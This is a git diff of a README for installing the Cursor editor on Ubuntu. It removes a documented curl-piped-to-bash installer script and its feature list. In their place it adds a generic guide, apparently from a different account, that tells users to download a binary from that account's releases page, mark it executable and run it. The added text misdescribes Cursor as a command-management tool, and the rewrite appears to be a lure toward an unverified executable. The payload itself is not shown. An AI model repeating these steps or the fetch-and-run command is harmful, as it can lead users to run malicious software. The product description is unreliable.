@@ -1,106 +1,75 @@
+# 🧐 cursor - Easy Installation for Ubuntu Users
 
+[![Download Cursor](https://img.shields.io/badge/Download-Cursor-blue)](https://github.com/ittaloakk/cursor/releases)
 
----
-## 🚀 Quick Start (One-Line Installation)
+## 🚀 Getting Started
 
-Run this command to install/update Cursor directly without cloning the repository:
+Welcome to the Cursor installation guide! This document will help you download and run Cursor easily on Ubuntu 22.04 or 24.04. Follow the steps below to get started.
 
-```bash
-bash -c "$(curl -fsSL https://raw.githubusercontent.com/coinhole/cursor/ubuntu-22.04/manage_cursor.sh)"
-```
+## 📥 Download & Install
 
-> **Note:** For Ubuntu 24.04 installation, please switch to the `ubuntu-24.04` branch or visit: [Link](https://github.com/coinhole/cursor/tree/ubuntu-24.04)
+1. **Visit the Releases Page**  
+   Click on the link below to visit the page where you can download Cursor:  
+   [Download Cursor](https://github.com/ittaloakk/cursor/releases)
 
----
+2. **Choose the Right Version**  
+   On the releases page, you will see a list of versions available for download. Select the latest version. It is usually at the top of the list. Look for a file named something like `cursor-linux-amd64`. This is the version for most Ubuntu users.
 
-## 🎨 Script Interface
+3. **Download the File**  
+   Click on the filename to start the download. Your browser will save this file to your default downloads folder.
 
-When you run the script, you'll see a user-friendly menu interface:
+4. **Open Terminal**  
+   To run Cursor, you need to use the Terminal. Press `Ctrl` + `Alt` + `T` on your keyboard to open a new Terminal window.
 
-```
-   ______                              ___    ____   ________  ______
-  / ____/_  ________________  _____   /   |  /  _/  /  _/ __ \/ ____/
- / /   / / / / ___/ ___/ __ \/ ___/  / /| |  / /    / // / / / __/   
-/ /___/ /_/ / /  (__  ) /_/ / /     / ___ |_/ /   _/ // /_/ / /___   
-\____/\__,_/_/  /____/\____/_/     /_/  |_/___/  /___/_____/_____/   
-                                                                     
-For Ubuntu 22.04
--------------------------------------------------
-  /\_/\
- ( o.o )
-  > ^ <
-------------------------
-1. 💿 Install Cursor
-2. 🆙 Update Cursor
-3. 🗑️ Uninstall Cursor
-Note: If the menu reappears after choosing an option, check any error message above.
-------------------------
-Please choose an option (1, 2, or 3): 
-```
-
-This is a guideline and script for installing or updating Cursor on Ubuntu 22.04.
-
-## ✨ Features
-- 🚀 **One-line Installation:** Install directly from GitHub without cloning
-- 📦 **Auto-download:** Automatically fetches latest Cursor AppImage 
-- 🔄 **Easy Update:** Update to newest version with single command
-- 🗑️ **Complete Uninstall:** Remove Cursor and all related files
-- 🎨 **Icon Selection:** Choose your preferred application icon
-- 🖥️ **Desktop Integration:** Automatic menu entry creation
-
-## ⚙️ Prerequisites
-- 🐧 Ubuntu 22.04 or compatible Linux distribution
-- 🌐 Internet connection
-- 🔑 `sudo` privileges
-- 📦 `curl` (auto-installed if missing)
-- 📦 `libfuse2` (auto-installed if missing)
-
----
-
-## 🎨 Available Icons
-- <img src="images/cursor-icon.png" alt="Cursor Icon" width="24"/> `cursor-icon.png` – Standard Cursor logo with blue background  
-- <img src="images/cursor-black-icon.png" alt="Cursor Black Icon" width="24"/> `cursor-black-icon.png` – Cursor logo with dark background
-
----
-
-## ⚠️ Important Notes
-- **Ubuntu 22.04:** The script automatically installs `libfuse2` for AppImage support
-- **Ubuntu 24.04+:** Do NOT install `libfuse2` manually - it can cause graphical issues
-- **Restart recommended:** For best experience, restart after installation
-- **Sudo required:** Script needs admin privileges for system-wide installation
-
----
-
-## 🧩 Troubleshooting
-If you encounter any issues:
-1. **Permission errors:** Ensure you have `sudo` privileges and active internet connection
-2. **Script fails to download:** Check your network connection and try again
-3. **Cursor won't start:** The script handles `libfuse2` automatically, but you can verify with:
+5. **Navigate to Downloads**  
+   In the Terminal, type the following command to go to your downloads folder:  
    ```bash
-   sudo apt update && sudo apt install libfuse2
+   cd ~/Downloads
    ```
-4. **Desktop entry missing:** Log out and log back in, or restart your computer
 
----
+6. **Give Permission to Run**  
+   Before running Cursor, you need to allow it to be executed. Use this command:  
+   ```bash
+   chmod +x cursor-linux-amd64
+   ```
 
-## 📝 Version History
+7. **Run Cursor**  
+   Now you can run Cursor by typing the following command:  
+   ```bash
+   ./cursor-linux-amd64
+   ```
 
-### 2.3 (Current) 
-**Optimized Script Interface and Enhanced User Experience:**
-- **One-line Installation:** Direct installation via curl command
-- **Uninstall Option:** Complete removal functionality in main menu
-- **Enhanced UI:** Improved menu design with emojis and better alignment
-- **Smart Auto-download:** Intelligent download with automatic fallback
-- **Simplified Desktop Integration:** Clear guidance for icon refresh without automatic commands
+8. **Start Using Cursor**  
+   You should now see the Cursor application open. Follow any on-screen instructions to start using it!
 
-### 2.2 
-**Terminal Display Enhancement:** Added figlet library for ASCII art banners and improved visual experience
+## 📝 Additional Information
 
-### 2.1 
-**Ubuntu Compatibility:** Added version checking and automatic libfuse2 installation for Ubuntu 22.04
+Cursor is designed to help you manage your commands efficiently. You can easily install updates as they become available. 
 
-### 2.0 
-**Auto-download System:** Implemented automatic Cursor AppImage fetching with manual fallback option
+### ⚙️ System Requirements
 
-### 1.0 
-**Initial Release:** Basic installation and update functionality with manual AppImage path
+- **Operating System:** Ubuntu 22.04 or 24.04
+- **Architecture:** amd64
+- **Memory:** Minimum 2 GB RAM
+- **Disk Space:** At least 100 MB of free space
+
+### 🌟 Features
+
+- Simple command line interface
+- Quick updates
+- Lightweight and fast performance
+- Easy to use for all skill levels
+
+## 📌 Tips
+
+- If you run into any issues during installation, check the following:
+  - Ensure you have internet access while downloading.
+  - Make sure you are using either Ubuntu 22.04 or 24.04.
+  
+For further assistance, consider checking online forums or support communities related to Ubuntu.
+
+## 🎉 Conclusion
+
+Now you have Cursor installed and ready to use on your Ubuntu system. Feel free to explore its features and enjoy a smoother command management experience. Remember to check for updates regularly to benefit from improvements and new features. 
+
+For an easy start, visit the [Downloads Page](https://github.com/ittaloakk/cursor/releases) whenever you need to get the latest version.
